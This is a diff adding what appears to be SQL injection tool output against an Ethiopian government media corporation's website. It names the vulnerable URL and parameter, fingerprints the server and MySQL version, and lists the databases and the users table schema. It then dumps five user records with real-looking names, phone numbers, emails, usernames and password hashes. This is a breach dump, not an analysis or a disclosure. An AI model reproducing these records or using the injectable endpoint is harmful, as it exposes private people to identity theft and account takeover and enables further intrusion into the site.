@@ -1,0 +1,50 @@
+.gov Government
+
+.et Ethiopia
+
+Benishangul Gumuz Media Corporation
+
+https://www.bgmma.gov.et/post.php?id=17
+
+the back-end DBMS is MySQL
+web application technology: PHP 7.2.34, Nginx
+the back-end DBMS: MySQL >= 5.0
+banner: '5.5.62'
+
+available databases [3]:
+[+] bgrsmma
+[+] information_schema
+[+] test
+
+Database: bgrsmma
+Table: users_table
+[12 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| email      | varchar(30)  |
+| firstname  | varchar(30)  |
+| id         | int(11)      |
+| lastname   | varchar(30)  |
+| middlename | varchar(30)  |
+| password   | varchar(120) |
+| phone      | varchar(30)  |
+| photo      | varchar(30)  |
+| reg_date   | date         |
+| reg_time   | time         |
+| status     | varchar(30)  |
+| username   | varchar(30)  |
++------------+--------------+
+
+Database: bgrsmma
+Table: users_table
+[5 entries]
++-----------+-------------+------------+--------------+-------------------------+----------------------------------+
+| firstname | lastname    | phone      | username     | email                   | password                         |
++-----------+-------------+------------+--------------+-------------------------+----------------------------------+
+| Mulualem  | Temesgen    | 0918667200 | mulu         | mulu2006hu@gmail.com    | d3432340103234d636ecca0286134a8c |
+| Yimer     | Muhie       | 0945341289 | yimer        | ymr4u.asu@gmail.com     | 3f7ce15014d805c6a69b6ec597be8826 |
+| Mohamud   | Abdurahaman | 0942431251 | mohamod      | T@gmil.com              | faee317b5efa1bc84518a7d627d7172b |
+| Worku     | Goshu       | 0922210565 | hiwan_golden | workugoshu244@gmail.com | 59af2f0fb81ee545b750c7d6de3530b3 |
+| Nitsuh    | Damite      | 0910829859 | natan@2020   | nitshuabera23@gmail.com | cf55e3b90d334b264a196d7b2fe0dd3d |
++-----------+-------------+------------+--------------+-------------------------+----------------------------------+
